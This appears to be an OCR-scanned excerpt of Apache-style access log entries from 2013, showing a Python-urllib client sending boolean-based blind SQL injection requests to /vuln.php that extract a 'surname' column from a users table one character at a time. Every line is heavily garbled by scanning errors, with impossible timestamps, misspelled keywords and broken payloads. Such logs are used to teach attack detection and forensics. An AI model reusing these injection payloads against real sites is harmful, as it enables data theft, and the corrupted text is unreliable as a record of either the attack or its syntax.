172.16.93-1 - = (03/Mow/2013:18:25:67 +0000) “GET /vuln.phe?id=1E20MMDE200RD(MID( (SELECT
ZOU FNULL (CAST(surnamet20ASK2OCHAR) ,0x20)X20FROWL2 user sA200RDERE2OBVE20ig3201 INITE
200,1),3,1))>64 MITP/1.1" 200.127 iython-urllib/2.7"

172.16.93.1 ~~ (03/Mov/2013:18:25:07 +0000) “GET. /vuln.php?id=1X20ANDK2008D(WID( (SELECT
A20{FMULL (CAST(surnamet20ASK2OCHAR) 0x20 X20FRONK2 user sK20ORDERE20BVR201 201 1MITE
200,1),3,1))96 HTTP/1.1" 200.127 =<" *Python-urllib/2.7™

172,16.93.1 - ~ (03/Nov/2013; 18:25:07 +0000) “GET. /vuln.php?id=1%20ANDR20080(WID( (SELECT
ZO FULL (CAST(surnamet20ASK2OCHAR) ,0+20)X20FROWE20user SA2OORDERE20BVE201g320LINITE
200,1),3,1))9112 HFTP/1.1" 200 75 *<" “Python-urllib/2.7"

172:16.93.1 ~~ (03/Nov/2013:18:25:07 +0000) “GET /vuln.php?id«1X20ANDK2008D(WID( SELECT
201 FNULL(CAST(surname%20ASK2OCHAR) ,0*20)X20FROWK20user sA20ORDERS20BVR201 3201 INITS
200,1),3,1))>108 HTTP/1.1" 200 127 *-" "Python-urllib/2.7~

172:16.93.1 ~~ [03/Nov/2013:18:25:07 +0000] "GET /vuln_php?id«1X20ANDA2008D(WID{ (SELECT
ZOU FMULL (CAST(surnamet20ASKZOCHAR) ,0x20)X20FROWL2O0user XZOORDERK20BVR201gX20LINITE
200,1),3,1))>108 HTTP/1.1~ 200 75 ~~" “Python-uellib/2.7"

172.16.93.1 ~~ [03/Nov/2013:18:25:07 +0000) “GET /vuln.php? id= X20ANDA200RD(WID( (SELECT
SDOUFMULL (CAST(surnamet20ASK2OCHAR) 0x20 )X20FROWL20use"S4200RDERL2OBVE20\ 4201 INITE
200,1),3,1))>106.MTTP/1.1" 200 75 *:" "Python-urllib/2.7”

172:16.93.1 = = [03/Nov/2013:18:25:07 +0000) “GET /vuln php?ide1X20ANDA2008D(WID( SELECT
ZOU FNULL (CAST(surname420ASK2OCHAR) ,0x20)X20FROML20user sA200RDERA2OBVA201 45201 INITE
200,1),3,1))>105 HFTP/1.1" 200 75 *-" *Python-urllib/2.7"

172:16.93.1'- = (03/Nov/2013:18:25:07 +0000) “GET /vuln.php?id=1%20ANDA2008D(WID( (SELECT
DOU FMULL (CAST(surnamet20ASK2OCHAR) ,0x20)X20FROWL20user s4200RDERL20BVI20{ 4201 1MITE
200,1),4,1))>128 MTTP/1.1" 200 75 *<" *Python-urllib/2.7”

172:16:93.1 = = (03/Nov/2013:18:25:07 +0000) “GET /vuln.php?id=1%20ANDA20080(WID( SELECT
2D FNULL (CAST(surnamet20ASK2OCHAR) ,0+20)X20FROWK2 user sA20ORDERE20BVE201 201 INITE
200,1),4,1))264 MITP/1-1" 200.127 *-" *Python-uellib/2.7"

172:16.93.1 - ~ (03/Mov/2013:18:25:07 +0000) “GET _/vuln.php?id=1X20ANDX2008D(WID( (SELECT
20{FNULL(CAST(surnamet20ASK2OCHAR) .0+20)X20FROWK20user SA2OORDERK20BVK201g20LINITE
200,1),4,1))296 MITP/1.1" 200.127 ~-" “Python-urllib/2.7~
